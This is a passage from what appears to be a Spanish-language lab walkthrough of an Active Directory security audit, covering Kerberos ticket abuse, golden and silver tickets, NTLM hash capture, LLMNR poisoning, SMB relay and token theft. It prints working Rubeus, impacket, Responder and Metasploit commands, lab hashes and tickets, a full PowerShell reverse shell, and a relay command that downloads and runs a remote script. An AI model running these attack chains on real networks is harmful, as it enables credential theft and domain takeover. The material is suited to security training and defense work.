rubeus.exe ptt /ticket:doIFyDCCBcSgAwIBBaEDAgEWooIEzjCCBMphggTGMIIEwqADAgEFoQwbCkNPUlAuTE9DQUyiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkNPUlAuTE9DQUyjggSKMIIEhqADAgESoQMCAQKiggR4BIIEdAj834JeavppTumcmbs3fg11wVcUCZrNsLmYtkhCm1iFVI7uMFXy1DOgAP1brwQvIuv/ADK7L3CjA159td6bCWu+rCv/BlyfHmH5HpvVpDTseAy2IR7/bzjzPBXomA9MlI4MyY9Xv88+jGc4wvoWMWILCvoLK/Pmjc+QxJHSMMzLhhyCGpJUL1Gozx53KPVbDfTELPjJ+NdrpTYxFOXLOrl845CpeRPyrx5VzgpP6rmGtpM74IIjh1AG381gjO98rB/0LeDfZubZ13l4VwuDYBU42wkRfRqu8RxsJ2gxz34h9/ZzFSLSEoimkDZ3WctbCAJBd+/O9mdZeLjcZAJlO03MD/t4voqG3goyznnuwERoTqUg/M/4AWt41KRx4N62pHwLIJywK43V9ZyJbF2yjkoECNGfiziiXLGCTt7R9xhIbomgzdhu4bi4q0yNmm6IoUbwn0h0UlJ69i+xIkx47O0anWb3oxX4BTmSxgUEB2fZDlwKiFFXIX68iad5+MHzmryqooHfSM5hJxVRX8daIyOOZME9qPXwP0eLhRNZd563y4Rog6K0apoOvsOp8GA8wVdaXVBYCE+v8n/vTui5h1GkHnyM0flCXRWdpXz2jCIT3rF63glKuqfBv+LCaMauxFJ9PWqPNC4YanWpx4eRaMAb4i6oC61H4g85GaPPywvUoAX4Y7mOd4Hk03NzjcsV5DmrskyskHme3MfF+cN7/3JvkuuOvmHrD+jTXX9I7m+U1aQrF9Ur+JzlwreQF2HffTQMsOEpJBYsmbz5Vh+9jM8wIgm0KwMJa5vUTZMWkkDLyOJ50p39TrAkQTGHOW8u86NaO6AkGiV5kullUmGi9Q7QMrION/a150UwVovoQiyWIQYcRBHUuDx0L9/LhXxW6dqsA6IWrz3fYCx9nhDzQ+oMqoyKkRcFRNdffcY5CSqRcaYeyUOxez1Kmlx0JCnyaWp0bie8h8Uw0aviIUioQDTF2uslKpBeTV0toMlZTKsOBnBEB5UV4UZSdMqg5Bmi7mCQh9/Vi+a/QNfTpzO6yDkARF+I8Jbk9ik48QEQnm65UPCnBPKrPZ6Z84kA2hDp+dnAqH7nU+5vS4tYiEBQrtaxIk0D+apw/di+TxuNNhsYHoF05n9S3RW7pMlgOVsW1jCBkYTsHML/Kuy/gsnm2vziBOsieGD1LvSWZ5k62gYOqsgQdpwGJDTdLDqXyMGg05llC26OueMUmS0yrqUUkTChdjy2b3GLD5RW/68ANzLqpIoebk7Gde3+q/PZIazg2e4JHIdSlREnRHEmTinMXWSJyqGIoOUaDqeo1ho+B2/0ZlSbCOcmzCae7akySpsEl9c+qZocqKN6jz3D3Z3yBpMGOBc4pxCapCD5tZWyxqHQ3LaimJX+pFyRigMgsHkdLG+J+HYjiRreKCt5qLQS61wBVQB55hQTYA+XPcCmoajpbjhs1P6J9Eu1ghE4inPX5ARiNaIXmnZkqjKLKwuR0d58SZncsfWeK4d79Mw3NeGc8znkO6OB5TCB4qADAgEAooHaBIHXfYHUMIHRoIHOMIHLMIHIoCswKaADAgESoSIEIGBFeU9pKSa/cB7H7J5+zVu5CSklcU6d52CXfomvbE78oQwbCkNPUlAuTE9DQUyiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhZG9yowcDBQBA4QAApREYDzIwMjQwMzA0MjAzMDI2WqYRGA8yMDI0MDMwNTA2MzAyNlqnERgPMjAyNDAzMTEyMDMwMjZaqAwbCkNPUlAuTE9DQUypHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkNPUlAuTE9DQUw
```
![alt text](/assets/img/posts/ejemplo_auditoria_ad/39-5.png)

Si ahora listamos los tickets del logonsession.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/39-6.png)

Vemos como tenemos el TGT del usuario administrador por lo tanto podemos hacer peticiones a los servicios haciéndonos pasar por el usuario administrador.

```powershell
Enter-PSSession -ComputerName DC01
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/39-8.png)


### ASK-TGT/TGS

Si tenemos la capacidad de volcar el **TGT** y a clave de ssión de un usuario que tenga privilegios dentro del dominio, seremos capaces de mucho más que simplemente inyectarlo en la sesión de un usuario sin privilegios.

Para esto Rubeus cuenta con algunas opciones. Si hemos interceptado el hash **NTLM** de un usuario como el que tenemos de administrador, podemos usar una función de Rubeus para obtener un **TGT** sin necesidad de importarlo en la sesión de usuario sin privilegios.

#### Desde Windows

Esto se puede realizar sin privilegios de administración.

```powershell
NTLM--> a87f3a337d73085c45f9416be5787d86
```

Podemos verificar antes que nos encontramos en el usuario empleado1 sin privilegios y que el ticket es el correcto.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/40-1.png)

```powershell	
.\Rubeus.exe asktgt /domain:corp.local /user:administrador /rc4:a87f3a337d73085c45f9416be5787d86 /ptt
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/40-2.png)

Como vemos podemos obtener el **TGT** a nombre del administrador y su *sessionkey* sin necesidad de volcar nada de ninguna sesión ya que lo hemos pedido nosotros.

Ahora como en la anterior sesión podemos utilizar de forma más personal con diferentes herramientas sin necesidad de que windows lo haga de forma transparente.

Esto es útil para poder utilizarlo en nuestra propia máquina windows en la que tengamos control de seguridad y evitar así problemas con antivirus, etc y pedir TGS en nombre del usuario de dominio al que hayamos comprometido el hash.

```powershell	
.\Rubeus.exe asktgs /ticket:doIFqDCCBaSgAwIBBaEDAgEWooIEvjCCBLphggS2MIIEsqADAgEFoQwbCkNPUlAuTE9DQUyiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCmNvcnAubG9jYWyjggR6MIIEdqADAgESoQMCAQKiggRoBIIEZM2W4ARERmwsZynm+kHG8AsSfB7qHXwzH3vTwZnTpGqXNhQqMgB7MHOAlZkyTQ8X3CNzDvm1eL/pyop2dUMtTsv3YpiMseJ2Wep9I/EijVyciMJrWC74cthBDGRe8UDHJk/rhvLPap5WDUPQeb5TEcVgnLSISqeA5JMDoH29xic1xKDEERHNyozMw3t3pQL6eD+WlhrZEakucXfmgpMXiuHwiYkql22Ic3zruQzKhJQsBMLKqK2kzAJVdFs4JOY76ZWIFlYcwYhSzMGPveB6hETEmjIgbrhVUDQtRdVJ2BvH/Hd87Id7Xz76FDOOwOKAt1y6TIg0750Jv0+Myk08JzskYepSbmQfdJI2GNDyTia06uEdDLc0GweFYzzbTEi4Nfvn9ztydpPpyAcnbR73m+qytjLbtzhtgafw6smgnYirLdFGHNanSqwmSSxXBNfz+vpMh4Tso3DowHb++foh02k9VJ47o9JeaMfoJAOJdTRj5oi4rjCjkG4rtkaeg2FNfkVwbF35IC4PWOEgHkbEYM8i1coaAE0J2uLT0eR3mS2ODGqGMHvbZ4tvO5izZn37ANXznNcIJpAtm7jkQgbv1+gWbck/sSS6zO1lQKaHd/F7BbdzL43KF3BwiOwYjo61uFwNqERswrzRWDWt+E+NhKh3jA5Gtuxjn+SLcZSeXgTn4lk4l5eOxwofzqZyslT/rDuCkbbRgjvtyiwinQsw1pg8unKDtsSoO/pS+Tvnu8zKNViZkcUBBzB+Fqe7p+xXntnGk82fW3HocnSrE9CFl2VCiLLG9uGiYpSU6je4UzYT0/5kVb6dF/43O6UtcqWH8graXxmwucBI0IAQDUrC9yo2gfHmzWuFBX5uQYU1fKBTR3cHXZG5hDzfymwsccsTwxvqOYYFQBtf2tlk38JQpopKdF98viYCDuUd0b7cNi0yRhrgMZ4I8s+NH3Sl8rBUNnGuz9e8GffhMGDP/9WZqEhLZphp+taO1MzOo8mmBkyBWFu+2xNDgDwcjgTakPhHE6YZQlcG28v6jg91pf6kMQ9jC5jV+H29IIFaaFSudc3Ryphx/TUHTCHfpgZlZAmzAs72X8FTR/aqELaA5rr+eL+uup5PHfLiNt12NoIFaFTEGsFNm7RF8sI1zd2yIF3bnOXG52jHWuQ4xAXnXjwxur+aQYqfN2oLF8oxx/ZblO9+JY8l4nPQ04v3kE0lPTWp0ZZNqchx19cXwMY3DTu+K/1txchpjUcNB0bwt9FK3PoEroutRhUx0riNd98PUvQnGc2XZRcUCLU3NAUiqBMWPfasfsVZfscA/lxJWjkOWFWi6oRklxy46wQQjHh0PXk5y6HokITdCxjLnZlzBJWqN/ahy19rAwld9ojVldbXOrs6Quh4WqA+Th/UhA655YPeNzpuF9QmeQu3FTxV996UYyMui4nceVTV4XLcDcdNDO3PpZPYDtubGZK6S7JVp08w5ft+fmi4txmzyXOE7UJ5NCsTmLxHo4HVMIHSoAMCAQCigcoEgcd9gcQwgcGggb4wgbswgbigGzAZoAMCARehEgQQeDuchPGA3Givxf7Uo8+SgqEMGwpDT1JQLkxPQ0FMohowGKADAgEBoREwDxsNYWRtaW5pc3RyYWRvcqMHAwUAQOEAAKURGA8yMDI0MDMwNTA5MDAxN1qmERgPMjAyNDAzMDUxOTAwMTdapxEYDzIwMjQwMzEyMDkwMDE3WqgMGwpDT1JQLkxPQ0FMqR8wHaADAgECoRYwFBsGa3JidGd0Gwpjb3JwLmxvY2Fs /service:cifs/DC01.corp.local 
```
Aquí tenemos indicado el request de un TGS para el servicio cifs (consumo de ficheros) del equipo DC01 en nombre de administrador.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/40-6.png)

Podemos formatear este nuevo ticket e indicar a Rubeus que importe el ticket.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/40-7.png)

![alt text](/assets/img/posts/ejemplo_auditoria_ad/40-8.png)

Y ya podríamos consumir ese servicio como administrador del domino desde nuestra máquina de atacante.

#### Desde Linux

Vamos a ver que funciones podemos hacer con un TGT desde impacket.

```bash	
impacket-getTGT corp.local/administrador -hashes :a87f3a337d73085c45f9416be5787d86 
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/40-9.png)

Con este **TGT** podemos hacer cualquier cosa ya que podemos pedir **TGS** para cualquier servicio del dominio en nombre del administrador en este caso sin ni siquiera estar dentro del dominio como usuario, simplemente teniendo visibilidad.

En impacket hay una opción que nos permite usar autenticación kerberos y obtener las credenciales de la variable *KRB5CCNAME* de entorno.

Extraemos las credenciales del TGT anteriormente obtenido.

```bash
export KRB5CCNAME=/home/kali/Desktop/administrador.ccache
```

Indicamos usuario y máquina objetivo de donde volcar la sam y no le indicamos contraseña ya que usará el TGT.

```bash
impacket-secretsdump corp.local/administrador@DC01.corp.local -k -no-pass
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/40-11.png)

Al ser el DC en su base de datos no solo se encuentran los usuarios locales o el de administrador sino todos los usuarios del dominio.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/40-12.png)

Incluso claves en cifrado AES256,128,RC4 de cada uno de ellos.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/40-13.png)

Siendo así posible con las técnicas que hemos visto antes poder realizar cualquier servicio en nombre de cualquier usuario del domino sin necesidad de crackear nada.

Además podemos utilizar otros módulos de Impacket.

```bash
impacket-psexec corp.local/administrador@DC01.corp.local -k -no-pass
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/40-14.png)

![alt text](/assets/img/posts/ejemplo_auditoria_ad/40-15.png)

```bash
impacket-smbexec corp.local/administrador@DC01.corp.local -k -no-pass
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/40-16.png)

También podemos obtener TGS.

```bash
impacket-getST -spn cifs/DC01.corp.local -no-pass -k corp.local/administrador
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/40-17.png)


### GoldenTicket/SilverTicket

#### ¿QUE ES GOLDEN TICKET Y SILVER TICKET EN KERBEROS?

Consisten en mas o menos el mismo fundamento que lo anterior, construir nuestros propios **TGT** y **TGS**.

Para poder hacer esto necesitaríamos de alguna forma la clave privada o hash de la password del usuario *krbtgt* que vimos en el Domain Controler pues este se encarga de enviar todos estos tickets.

Por tanto estos métodos se basan en que ya hemos conseguido el hash de la contraseña del usuario *krbtgt* del **KeyDistributionCenter**.

Esto se ha podido hacer por ejemplo con los fallos de **DCSYN** haciendo una copia de la base *NTDS* donde se encuentra el hash o bien hemos conseguido el hash *NTLM* dentro de una maquina en memoria que correspondía a un usuario con privilegios de dominio o locales en el DC y hemos volcado la información de la memoria en la que se encuentra el hash del usuario *krbtgt*.

La clave de sesión se deriva de este hash.

Suponemos el caso anterior en el que hemos encontrado credenciales de un usuario con ciertos privilegios a nivel de dominio o locales en el DC01.

```bash
impacket-secretsdump administrador@192.168.20.5 -hashes :a87f3a337d73085c45f9416be5787d86 
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/41-1.png)

El que nos interesa concretamente es el *nthash*.

En el siguiente comando de impacket necesitamos el *domain SID* que es muy sencillo de obtener, sin privilegios y con powerview o el modulo ADD.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/41-2.png)

#### GOLDEN TICKET

Ahora si con impacket indicamos la información que tenemos. Lo interesante es que podemos generar un ticket para cualquier usuario que queramos ya que contamos con la clave del *krbtgt* hasheada para generarlos.

```bash	
impacket-ticketer -nthash 045ecb93536d5800d0b0e0b2ad06f7eb -domain-sid S-1-5-21-1064896359-874047782-4089327042 -domain corp.local administrador
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/41-3.png)

Impacket crea el golden ticket o tgt de administrador. Ahora si tenemos que volver a exportar la clave **KRB5CCNAME** para poder utilizar las mismas técnicas de antes.

```bash	
export KRB5CCNAME=/home/kali/Desktop/administrador.ccache
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/41-4.png)

#### SILVER TICKET

```bash		
impacket-ticketer -nthash 045ecb93536d5800d0b0e0b2ad06f7eb -domain-sid S-1-5-21-1064896359-874047782-4089327042 -domain corp.local -spn cifs/DC01.corp.local administrador
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/41-5.png)

Y a partir de ahora ya podemos usarlo con las anteriores técnicas.

### NTLM Roasting

Como hemos visto en las técnicas anteriores hemos necesitado de previamente volcar la información de algún equipo para poderlas llevar a cabo y, además este usuario debía ser como mínimo administrador del sistema local.

¿Qué ocurre cuando no tengamos acceso a un usuario con esas características? Podemos aprovechar debilidades que tiene el protocolo *NTLM* para obtener hashes y contraseñas.

#### Un repaso rápido al uso del protocolo NTLM

Un usuario consume un servicio utilizando *NTLM*, manda la petición para consumir el servicio con su nombre de usuario, el servicio recibe la petición y le manda un **nonce** o **challenge**.

El usuario recibe el **nonce**, lo cifra con su *password*, lo devuelve al servicio y este comprueba que el cifrado es correcto.

Podemos ver esta interacción con Wireshark.

Hacemos una petición desde DC01 por ejemplo:

![alt text](/assets/img/posts/ejemplo_auditoria_ad/42-1.png)

![alt text](/assets/img/posts/ejemplo_auditoria_ad/42-2.png)

DC01 envía la petición, WS01 devuelve el **challenge**.

Para poder crackear el hash *NTLM* que nos interesa necesitamos el **challenge** en plano y cifrado por lo que del segundo paquete lo podemos extraer en plano.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/42-3.png)

```bash	
Challenge--> 15fd7d2681b5fcc6
```

En el tercer paquete podemos ver la respuesta de *DC01* a *WS01* con el **challenge** cifrado.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/42-4.png)

![alt text](/assets/img/posts/ejemplo_auditoria_ad/42-5.png)

```bash	
ChallengeTruncated--> 811ffb4c156d792d759041755d36437e0101000000000000a7683e4ded6eda01ce6287bef18b59c3000000000200080043004f00520050000100080057005300300031000400140063006f00720070002e006c006f00630061006c0003001e0057005300300031002e0063006f00720070002e006c006f00630061006c000500140063006f00720070002e006c006f00630061006c0007000800a7683e4ded6eda0106000400020000000800300030000000000000000000000000300000574adf06c4204ead42a2b7fdf2104de04012845274b16e4da0cf7c0eea9322be0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00320030002e003100330031000000000000000000
```

También extraemos el nombre del usuario que realiza la petición, es muy sencillo porque va en plano dentro del paquete de autorización , ahí arriba lo podemos ver.

```bash
user--> administrador
```

El formato que vamos a necesitar para convertir el valor truncado en el valor del challenge en plano es el siguiente.

```bash
user--> administrador
Challenge--> 15fd7d2681b5fcc6
ChallengeTruncated--> 811ffb4c156d792d759041755d36437e0101000000000000a7683e4ded6eda01ce6287bef18b59c3000000000200080043004f00520050000100080057005300300031000400140063006f00720070002e006c006f00630061006c0003001e0057005300300031002e0063006f00720070002e006c006f00630061006c000500140063006f00720070002e006c006f00630061006c0007000800a7683e4ded6eda0106000400020000000800300030000000000000000000000000300000574adf06c4204ead42a2b7fdf2104de04012845274b16e4da0cf7c0eea9322be0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00320030002e003100330031000000000000000000
```

```bash
UserName:Domain:NTLM_Server_Challenge:NTProofStr:NTMLv2Response-NTProofStr
```

```bash	
Administrador::CORP:15fd7d2681b5fcc6:811ffb4c156d792d759041755d36437e:0101000000000000a7683e4ded6eda01ce6287bef18b59c3000000000200080043004f00520050000100080057005300300031000400140063006f00720070002e006c006f00630061006c0003001e0057005300300031002e0063006f00720070002e006c006f00630061006c000500140063006f00720070002e006c006f00630061006c0007000800a7683e4ded6eda0106000400020000000800300030000000000000000000000000300000574adf06c4204ead42a2b7fdf2104de04012845274b16e4da0cf7c0eea9322be0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00320030002e003100330031000000000000000000
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/42-6.png)

### LLMNR/NBTNS Poisoning

Esta técnica se basa en algo similar a la anterior pero sin necesidad de capturar la red del dominio o estar dentro de la misma.

Para esta técnica hay que entender bien dos protocolos de windows que sirven para resolver nombres DNS.

Cuando se utiliza un nombre en vez de una dirección IP como podemos ver en el siguiente comando.

```powershell
ls \\WS01\C$
```

Debe de haber algun proceso o pieza que se encargue de resolver ese nombre porque todas las comunicaciones por debajo se realizan a nivel de IP al igual que en las páginas web.

Normalmente de esto se encarga el servicio DNS del domain controller.
Si hacemos referencia a un nombre de dominio que no existe y capturamos con wireshark.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/43-1.png)

Vemos que intenta resolverlo usando DNS y como no puede empieza a utilizar otros protocolos de windows como *LLMNR* **Link Local Multicast Name Resolution**

Un protocolo que manda una petición preguntando a que dirección corresponde el nombre del equipo y lo manda a una dirección multicast por *IPV4* e *IPV6* que se corresponde al grupo donde se encuentran todos los nodos de la red.

Si no puede resolverlo tampoco por *LLMNR* utiliza *NBNS* **Net Bios Name Service**

![alt text](/assets/img/posts/ejemplo_auditoria_ad/43-2.png)

Aprovechando esto como atacante podemos monitorizar si nos llega cualquiera de los dos protocolos que acabamos de ver y cuando llegue una la resolvemos nosotros indicando que la dirección correspondiente es la del atacante. Esto intenta establecer una autenticación con nosotros y ocurre todo el proceso de autenticación con el *challenge*  y nos quedamos con los datos necesarios para el anterior proceso que vimos.

Podemos hacer este envenenamiento de estos protocolos mediante Responder.

```bash
sudo responder -I eth0 -bP
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/43-3.png)

Esta herramienta crea varios servidores y está esperando diferentes peticiones, cuando intenten realizar una petición y no sean capaces de resolver el nombre le llegará la petición y la responderemos nosotros haciendonos pasar por el servicio original.

Ahora podemos capturar de nuevo con Wireshark y ver que ocurre si volvemos a intentar resolver un nombre que no existe.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/43-4.png)

Vemos que utiliza los protocolos *MDNS* y *LLMNR* haciendo multicasting y pregunta varias veces pero si nos fijamos, esta vez si hay alguien que le responde y si nos fijamos en la IP tanto *IPV4* como *IPV6* se trata de la dirección **192.268.20.129** que es de la máquina  Kali.

Si suponemos que esto ha ocurrido porque el *“administrador”* ha intentado acceder a algún recurso compartido o workstation y se ha equivocado en el nombre al introducirlo.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/43-5.png)

No le indica que no exista sino que no tiene acceso, por supuesto esto sería algo raro y el mensaje se puede modificar para que siga dando error por no encontrar la dirección.

Si vamos a nuestra máquina Kali.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/43-6.png)

Con esto responder de forma automática ha realizado ese intercambio de challenge y ha obtenido los hashes que además nos proporciona en el formato para poder ser crackeados.

Todo esto se realiza para cualquier usuario que falle dentro de la red y por supuesto esto no solo es si se intenta conectar desde una powershell o cmd sino que desde el propio explorador de windows si se falla se produce de igual forma.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/43-8.png)

Error tonto de poner O en vez de 0.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/43-9.png)

Todo esto nos puede permitir acceder a credenciales sin ser un usuario del dominio.

### NTLM/SMB Relay

¿Podríamos usar el hash obtenido en el proceso anterior para realizar un Pass the Hash?

Si capturamos una autenticación mediante *NTLM* podemos obtener los **challenge** en plano y hasheado para poder crackearlos.

No necesitamos estar capturando la red ni nada por el estilo gracias a envenenar esos protocolos. Por supuesto el crackear contraseñas conlleva que si es muy compleja o no se encuentra en ningún diccionario puede llegar a ser imposible o tardar demasiado en ser crackeada.

La respuesta es que este hash no es posible utilizarlo para el *PassTheHash* ya que no se trata de la contraseña del usuario hasheada sino un numero aleatorio que se genera cada vez que se realiza la petición de autenticación.

Para obtener este hash vamos a utilizar NTLM relay.

Utilizamos otra herramienta junto a la anterior que levantará un servidor SMB falso el cual capturará la petición que lance el cleinte y la reenviará a la máquina que estemos interesados en acceder.

Por ejemplo, el administrador manda una petición *NTLM*, lo respondemos con nuestro *SMB* falso y lo redirijo a otra máquina donde nos interese, es decir que nos ponemos en medio de la comunicación para quedarnos con la comunicación al servicio ya que aunque no tengamos la autenticación ni el hash no importa porque ha sido el cliente real el que la ha cifrado por nosotros.

Los servicios a los que queramos acceder con esta técnica deben cumplir una característica que es el **firmado SMB**, ya que autentica el origen.

Para saber que máquinas lo tienen activo y cuales no hacemos uso de crackmapexec.

```bash
crackmapexec smb 192.168.20.0/24 
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/44-1.png)

Vemos que la máquina DC01 si lo tiene activado mientras que WS01 no lo tiene.

Guardamos las IP de los objetivos en un fichero y con impacket levantamos el servidor SMB falso.

```bash
impacket-ntlmrelayx -smb2support -tf targets.txt
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/44-2.png)

Envenenamos el tráfico con Responder, pero antes editamos la configuración de Responder para deshabilitar sus servicios SMB y HTTP.

```bash
sudo nano /etc/responder/Responder.conf
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/44-3.png)

```bash	
sudo responder -I eth0 -bP
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/44-4.png)

Ahora lo que está ocurriendo es que responder envenena el tráfico como antes y si alguien se equivoca lo redirije a nuestro servidor SMB falso que de nuevo hace de cliente y reenvia la petición al serivicio real en la máquina objetivo de nuestro archivo targets.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/44-5.png)

Fallamos en la resolución de nombre pero eso es lo que vería el administrador.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/44-6.png)

Porque lo que nosotros vemos es que nos ha volcado por completo la base de datos SAM del equipo objetivo WS01 y por supuesto con esto tenemos el hash NTLM del usuario administrador local del sistema WS01.

Por supuesto el volcado de SAM es la configuración por defecto de crackmapexec pero claramente podemos ejecutar cualquier comando con los privilegios de usuario que interceptemos.

Por ejemplo:

```bash
impacket-ntlmrelayx -smb2support -tf targets.txt -socks
```

Podemos ejecutar todo a través de un proxy socks, por lo que cuando se produzca de nuevo un error por parte de un usuario como antes.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/44-7.png)

De nuevo engaña al cliente original pero además nos crea una conexión proxy socks que podemos usar en nombre del usuario que hayamos interceptado en las máquinas objetivo que tengamos en targets.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/44-8.png)

Con proxychains.

```bash
sudo nano /etc/proxychains4.conf
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/44-9.png)

Modificamos el puerto por donde escucha el NTLMRelay.

```bash
proxychains4 crackmapexec smb 192.168.20.131 -u 'Administrador' -d 'corp' -p 'indiferente' --lsa --sam 
```

Igualmente hay que pasar una contraseña pero es indiferente ya que tenemos una sesión activa que no necesita autenticación.
Indicamos con qué herramienta queremos usar el proxy y de que usuario es la sesión y todos los parámetros que queramos.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/44-10.png)

También podemos ejecutar una reverse shell de esta forma.

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Creamos servidor.

```bash
python2 -m SimpleHTTPServer
```

```bash
impacket-ntlmrelayx -smb2support -tf targets.txt -c "powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.20.129:8000/reversePowerShell.ps1')\""
```

```bash
netcat -lvp 5555
```

Escuchamos con netcat y ahora si cuando falle algún usuario.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/44-12.png)


### Token Impersonation

Cuando nos autenticamos en un sistema windows se crea una *logonsession* del usuario y después podemos ejecutar procesos que llevan asociados un *access token* donde van asociados los privilegios para acceder a los diferentes securable objects. Ese token de acceso referencia la logon session donde estaban los credenciales.

El objetivo de esta técnica es teniendo permisos de administración locales, cogemos el token de acceso de otro usuario con una *logon session* activa en el sistema y vamos a utilizarlo para realizar peticiones en su nombre.

Para este caso hemos llegado a obtener las credenciales o hash de empleado1.

Usaremos metasploit.

```bash
msconsole
use exploit/windows/smb/psexec
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/45-1.png)

> Nota: En el set smbpass se podría haber introducido el hash
{: .prompt-info }

![alt text](/assets/img/posts/ejemplo_auditoria_ad/45-2.png)

Actualmente somos administradores del equipo de forma local pero no de dominio, lo que nos permite copiar tokens por lo que vamos a suponer que en la maquina hay una sesión ya sea dentro o de forma remota de un administrador de dominio por lo que hay un *sessionlogon* del este usuario y el proceso que esté usando tiene un token con sus privilegios.

![alt text](/assets/img/posts/ejemplo_auditoria_ad/45-3.png)

Desde meterpreter listamos los procesos del sistema.

```bash
meterpreter > ps
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/45-4.png)

Vemos el proceso que tiene el usuario administrador. Copiamos el proccessID y lo inyectamos en nuestro meterpreter.

```bash
meterpreter > steal_token 3924
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/45-5.png)

![alt text](/assets/img/posts/ejemplo_auditoria_ad/45-6.png)

![alt text](/assets/img/posts/ejemplo_auditoria_ad/45-7.png)

En el caso de no poder copiar los tokens podemos migrar nuestro payload a el proceso que se esté ejecutando con el access token de ese usuario.

```bash
meterpreter > migrate 3924
```

![alt text](/assets/img/posts/ejemplo_auditoria_ad/45-8.png)

![alt text](/assets/img/posts/ejemplo_auditoria_ad/45-9.png)

> Nota : inyectar nuestro payload o migrar puede romper el proceso y romper la sesión en la práctica
{: .prompt-warning }

